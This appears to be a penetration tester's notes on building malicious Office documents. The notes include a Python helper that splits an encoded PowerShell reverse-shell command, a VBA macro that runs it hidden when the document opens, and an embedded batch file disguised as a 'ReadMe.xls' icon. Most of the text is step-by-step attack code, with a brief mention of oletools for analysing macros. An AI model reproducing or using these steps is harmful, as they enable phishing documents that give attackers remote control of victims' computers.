#### Office macro reverse shell
[[1._Reverse Shells (WIN)#hta raw]]

Copy everything from: 
"powershell.exe -nop -w hidden -e ....... " into the str variable in split.py:

split.py
```python - kali
str = 

n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

run the python file:

```bash - kali
python split.py
```

Paste to notepad++, shift over 1 tab.

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
	.......................
    Str = Str + "wB0AGEAcgB0ACgAJABzACkAOwA="
    
    CreateObject("Wscript.Shell").Run Str

End Sub

```

New document in Word.
View > Macros > View Macros

Macro name: MyMacro

Macros in: Document1

![[Pasted image 20220603093224.png]]

Click Create.

Paste in Macro code.  Save.

Tools to help analyze the VBA Macro in the document:
https://github.com/decalage2/oletools/wiki/Install
```bash - kali
sudo -H pip install -U oletools
```

https://github.com/decalage2/oletools/wiki/olevba
```bash - kali
olevba --reveal Shelly.doc
```

#### Office Object Linking and Embedding

First, make a "launch.bat" file.

Paste in your powershell code form above:

```
START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4kAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAU.....
vAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA= 
```

Insert > Object > Create from File > launch.bat

Select "Display as icon"
Click "Change Icon"
Chang icon if desired.
Change the Caption: "ReadMe.xls"

Click "OK"
